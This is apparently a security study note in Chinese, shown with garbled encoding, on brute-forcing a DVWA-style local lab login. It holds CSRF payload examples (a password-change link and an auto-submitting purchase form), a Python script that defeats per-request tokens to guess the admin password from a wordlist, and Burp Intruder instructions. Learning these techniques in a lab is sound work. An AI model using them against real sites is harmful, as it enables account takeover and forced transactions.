# æš´åŠ›ç ´è§£

- Tokenä¸CSRFæ”»å‡»
    - è·¨ç«™è¯·æ±‚ä¼ªé€ æ”»å‡»ï¼ˆCSRFï¼‰
        
        <aside>
        ğŸ’¡ è¯·æ±‚ç”±ç”¨æˆ·æºå¸¦è‡ªèº«Cookieå‘å‡ºï¼ŒæœåŠ¡å™¨æ­£ç¡®å›åº”
        
        </aside>
        
        - æ”»å‡»è¿‡ç¨‹
            1. ç”¨æˆ·è®¿é—®ç›®æ ‡ç½‘ç«™Aï¼Œè·å–é“¶è¡Œç½‘ç«™çš„Cookie
            2. ç”¨æˆ·æœªå…³é—­é“¶è¡Œç½‘ç«™ä¼šè¯ï¼Œè®¿é—®é’“é±¼ç½‘ç«™
            3. é’“é±¼ç½‘ç«™è¦æ±‚è®¿é—®é“¶è¡Œç½‘ç«™ï¼Œå‘å‡ºRequest
            4. æµè§ˆå™¨æºå¸¦å·²ä¿å­˜çš„Cookieè®¿é—®é“¶è¡Œï¼Œå¤±çªƒ
        - å…·ä½“åˆ†ç±»
            - GETå‹è¯±å¯¼
                1. ç”¨æˆ·è®¿é—®æŸç½‘ç«™ï¼Œä¿®æ”¹è´¦å·å¯†ç 
                    
                    ```jsx
                    http://.../user.php?id=3212&passwd=1123
                    ```
                    
                2. ç”¨æˆ·å¤„äºæœªå…³é—­è¯¥ç½‘ç«™çŠ¶æ€
                3. è¯±ä½¿ç”¨æˆ·ç‚¹å‡»é’“é±¼é“¾æ¥
                    
                    ```jsx
                    http://.../user.php?id=3212&passwd=0000
                    ```
                    
                4. ç”¨æˆ·å¯†ç è¢«ç¯¡æ”¹
            - POSTå‹è¯±å¯¼
                1. æ”»å‡»è€…æŠ“åŒ…ï¼Œè·å¾—è§†é¢‘ç½‘ç«™ä»˜è´¹è¡¨å•æ ¼å¼
                2. ç”¨æˆ·è®¿é—®æŸä»˜è´¹è§†é¢‘ç½‘ç«™ï¼Œæœªå…³é—­è¯¥ç½‘ç«™
                3. ç”¨æˆ·ç‚¹å‡»é’“é±¼é“¾æ¥ï¼ŒåŒ…å«è¯·æ±‚è¡¨å•
                    
                    ```jsx
                    <form action=/coures/buy method=POST>
                    <input type="text" name="some_name" value="some_value" />
                    </form>
                    <script> document.forms[0].submit(); </script> 
                    ```
                    
                4. è¡¨å•è‡ªåŠ¨æäº¤ï¼Œç”¨æˆ·è¢«è¿«è´­ä¹°è§†é¢‘
    - Tokené˜²å¾¡
        
        <aside>
        ğŸ’¡ æ¯ä¸€æ¬¡è¯·æ±‚å‡ç”Ÿæˆä¸åŒçš„Tokenä½œä¸ºè®¤è¯
        
        </aside>
        
- é‡‡ç”¨Pythonè„šæœ¬
    
    <aside>
    ğŸ’¡ å‘ä¸å¸¦æœ‰è´¦å·å¯†ç å‚æ•°çš„ç©ºé¡µé¢å‘é€è¯·æ±‚ï¼Œè·å¾—ä¼ å›çš„Tokenï¼Œåˆ©ç”¨Tokençˆ†ç ´ä¸€æ¬¡ï¼Œå‘ä¸å¸¦æœ‰è´¦å·å¯†ç å‚æ•°çš„ç©ºé¡µé¢å‘é€è¯·æ±‚ï¼Œè·å¾—ä¼ å›çš„æ–°Tokenï¼Œåˆ©ç”¨Tokençˆ†ç ´äºŒæ¬¡
    
    </aside>
    
    ```python
    from bs4 import BeautifulSoup
    import requests
     
    header={'Host':'127.0.0.1',
            'User-Agent':'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:55.0) Gecko/20100101 Firefox/55.0',
            'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language':'zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3',
            'Referer':'http://127.0.0.1/vulnerabilities/brute/',
            'cookie':'PHPSESSID=8p4kb7jc1df431lo6qe249quv2; security=high',
            'Connection':'close',
            'Upgrade-Insecure-Requests':'1'
            }
    requrl="http://127.0.0.1/vulnerabilities/brute/"
     
    def get_token(requrl,header):
        response=requests.get(url=requrl,headers=header)
        print (response.status_code,len(response.content))
        soup=BeautifulSoup(response.text,"html.parser")
        input=soup.form.select("input[type='hidden']") 
    		# è¿”å›çš„æ˜¯ä¸€ä¸ªliståˆ—è¡¨
        user_token=input[0]['value'] 
    		# è·å–ç”¨æˆ·çš„token
        return user_token
     
    user_token=get_token(requrl,header)
    i=0
    for line in open("E:\Password\mima.txt"):
        requrl="http://127.0.0.1/vulnerabilities/brute/?username=admin&password="+line.strip()+"&Login=Login&user_token="+user_token
        i=i+1
        print (i , 'admin' ,line.strip(),end="  ")
        user_token=get_token(requrl,header)
        if(i==20):
            break
    ```
    
- é‡‡ç”¨BurpSuite Intruder
    1. æ‰“å¼€`Proxy`é€‰é¡¹å¡ï¼Œç‚¹é€‰`Intercept` ï¼Œ`Intercept is on` æ‹¦æˆªGETè¯·æ±‚æŠ“åŒ…
    2. é¼ æ ‡å³é”®ï¼Œç‚¹å‡»`Send to Intruder` ï¼Œè‡ªåŠ¨å¤åˆ¶GETè¯·æ±‚æ ¼å¼åˆ°`Intruder` é€‰é¡¹å¡
    3. æ‰“å¼€`Intruder` é€‰é¡¹å¡ï¼Œç‚¹é€‰`Position` ï¼Œå°†å¾…çˆ†ç ´çš„å­—æ®µåŒ…å«åœ¨ä¸¤`Â§` ä¹‹é—´ï¼Œç”¨`Add Â§`æ“ä½œ
    4. é€‰æ‹©`Attack Type` ï¼Œé€‰æ‹©åˆé€‚çš„æ”»å‡»æ–¹å¼
        - é€‰é¡¹ä»‹ç»
            - Sniperï¼šæ¥å—ä¸€ä¸ªPayloadåˆ—è¡¨
                
                
                | Aå­—æ®µ | Bå­—æ®µ |
                | --- | --- |
                | passwd | origin content |
                | abc | origin content |
                | origin content | passwd |
                | origin content | abc |
                
                | Payload |
                | --- |
                | passwd |
                | abc |
            - Battering Ramï¼šæ¥å—ä¸€ä¸ªPayloadåˆ—è¡¨
                
                
                | Aå­—æ®µ | Bå­—æ®µ |
                | --- | --- |
                | passwd | passwd |
                | abc | abc |
                
                | Payload |
                | --- |
                | passwd |
                | abc |
            - Pitch Forkï¼šæ¥å—é€‰æ‹©å­—æ®µæ•°ä¸ªPayloadåˆ—è¡¨
                
                
                | Aå­—æ®µ | Bå­—æ®µ |
                | --- | --- |
                | admin | passwd |
                | user | abc |
                
                | Payload A |
                | --- |
                | admin |
                | user |
                
                | Payload B |
                | --- |
                | passwd |
                | abc |
            - Cluster Bombï¼šæ¥å—é€‰æ‹©å­—æ®µæ•°ä¸ªPayloadåˆ—è¡¨
                
                
                | Aå­—æ®µ | Bå­—æ®µ |
                | --- | --- |
                | admin | passwd |
                | admin | abc |
                | user | passwd |
                | user | abc |
                
                | Payload A |
                | --- |
                | admin |
                | user |
                
                | Payload B |
                | --- |
                | passwd |
                | abc |
    5. è¿›è¡Œçˆ†ç ´è®¾ç½®
        - å¯¹äºä¸€èˆ¬å­—å…¸çˆ†ç ´
            1. æ‰“å¼€`Payload`é€‰é¡¹å¡ï¼ŒæŒ‰ç…§æ”»å‡»æ–¹å¼è®¾ç½®åˆé€‚çš„`Payload Set`ï¼Œåœ¨`Payload Option`ä¸­å¯¼å…¥çˆ†ç ´å­—å…¸ï¼Œä½¿ç”¨`Add` å’Œ`Load` æŒ‰é”®æ“ä½œ
            2. æ‰“å¼€`Resource Pool`é€‰é¡¹å¡ï¼Œæ·»åŠ æˆ–é€‰æ‹©åˆé€‚çš„çº¿ç¨‹æ± 
                
                <aside>
                ğŸ’¡ å¯¹äºRecursive Gripç±»å‹çš„Payloadï¼Œä¸æ”¯æŒå¤šçº¿ç¨‹ï¼Œéœ€å°†`Maximum concurrent requests`è®¾ç½®ä¸º1
                
                </aside>
                
        - å¯¹äºå¸¦æœ‰tokençš„å­—å…¸çˆ†ç ´
            
            <aside>
            ğŸ’¡ å…ˆæ¨¡æ‹Ÿæµè§ˆå™¨å‘é€ï¼ˆä¸å¸¦æœ‰è´¦å·å¯†ç å‚æ•°çš„ç©ºé¡µé¢ï¼‰è¯·æ±‚ï¼Œè·å¾—ä¼ å›çš„Tokenï¼Œåˆ©ç”¨Tokençˆ†ç ´ä¸€æ¬¡ï¼Œè·å–æ­¤æ¬¡çˆ†ç ´ä¼ å›çš„æ–°Tokenï¼Œåˆ©ç”¨Tokençˆ†ç ´äºŒæ¬¡
            
            </aside>
            
            1. æ”»å‡»æ–¹å¼ä¸º`Pitch Fork`
            2. æ‰“å¼€`Payload`é€‰é¡¹å¡ï¼Œè®¾ç½®`Payload Set`åˆ†åˆ«ä¸º`Simple List` `Recursive Grip`ï¼Œ
                - å¯¹äº`Simple List`ï¼Œåœ¨`Payload Option`å¯¼å…¥çˆ†ç ´å­—å…¸
                - å¯¹äº`Recursive Grip` ï¼Œåœ¨`Option`é€‰é¡¹å¡ä¸­è®¾ç½®`Grep-Extract` ï¼ŒæŠ“å–tokenä½œä¸ºç¬¬äºŒä¸ªPayloadï¼Œè®¾ç½®`Redierction` ä¸ºAlwaysï¼Œå¼ƒé€‰`Make unmodified baseline request`